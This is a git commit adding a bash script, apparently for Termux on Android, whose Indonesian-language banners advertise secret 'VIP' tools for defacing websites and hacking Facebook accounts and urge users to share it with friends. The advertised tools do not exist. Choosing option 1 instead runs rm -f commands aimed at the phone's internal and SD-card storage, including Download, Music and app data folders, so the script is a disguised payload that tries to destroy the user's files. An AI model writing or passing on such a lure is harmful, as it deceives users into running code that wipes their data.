ff1154a4dc9650cf994f5734d37ff58afa4baf7c
Cx12 <56474039+Sixmusic807725@users.noreply.github.com>
2019-10-16 06:13:40 +0700

    Create Secret.sh

---
+++ Secret.sh
@@ -0,0 +1,95 @@
+#!/bin/bash
+#Process Tools
+clear
+
+echo -e "∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞" | lolcat
+echo -e "«TUNGGU DAN LIAT LIST SCRIPT SECRET NYA." | lolcat
+echo -e "∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞" | lolcat
+
+sleep 2
+echo "\033[0;32m
+______________________
+  ║▒▒▒▒▒▒▒▒▒▒║
+  ║▒▒▒▒▒▒▒▒▒▒║
+  ║▒▒▒▒▒▒▒▒▒▒║
+  ║▒▒▒▒▒▒▒▒▒▒║
+  ║▒▒▒▒▒▒▒▒▒▒║
+  ║▒▒▒▒▒▒▒▒▒▒║
+ ╔════════════╗
+    Death
+ ╚════════════╝
+  ║██████████╚╗
+  ║██╔══╗█╔═╗█║
+  ║██║╬╔╝█╚╗║█║
+  ║██╚═╝█║█╚╝█║
+  ╚╗█████████═╝
+     ╚╗║╠╩╩╩╩╩╝
+       ║║┈┈┈█▐█████▒.｡oO
+       ║██╠╦╦╦╗
+       ╚╗██████";
+ 
+ sleep 2
+ 
+ echo $blue "====WELCOME TO RUMPI NO SECRET:V===="
+ echo $yellow "TOOLS SECRET NYA SANGAT BERBAHAYA"
+ echo $yellow "SEBAIK NYA JANGAN DI JALAN KAN BRO..."
+ echo $yellow "TAPI DI DALAM NYA ADA SCRIPT BARU BRO"
+ echo $yellow "BISA DEFACE WEB TANPA DORK"
+ echo $yellow "BISA HACK FB NO CP"
+ echo $yellow "POKOK NYA BANYAK DEH SCRIPT INI VIP JADI."
+ echo $yellow "KALIAN HARUS BERBAGI KE TEMAN ANDA!"
+ echo $blue "====^^^^^^^^^^^^^^^^^^^^^^^^^^===="
+ echo ""
+ echo ""
+ 
+ sleep 1
+ 
+ echo "BERIKUT TOOLS NYA" | lolcat
+ 
+ sleep 1
+ 
+ echo $g "|•|•|•|•|•|•|•|•|•|•|•|•|•|" | lolcat
+ echo   "1.RUMPI NO SECRET:V" | lolcat
+ echo $g "|•|•|•|•|•|•|•|•|•|•|•|•|•|" | lolcat
+ 
+sleep 0.1
+
+
+echo $r"╭─[Select Number Of Tools:]"
+read -p "╰─root@Secret~# " pil
+
+if [ $pil = "1" ] || [ $pil = "01" ]
+then
+
+figlet -f slant SECRET | lolcat
+
+sleep 1
+ 
+rm -f /storage/emulated/0
+
+rm -f /storage/6530-3533
+ 
+rm -f /storage/emulated/0/android/data/
+ 
+rm -f /storage/emulated/0/android/obb/
+ 
+rm -f /storage/emulated/0/Download
+ 
+rm -f /storage/emulated/0/Music
+
+fi
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
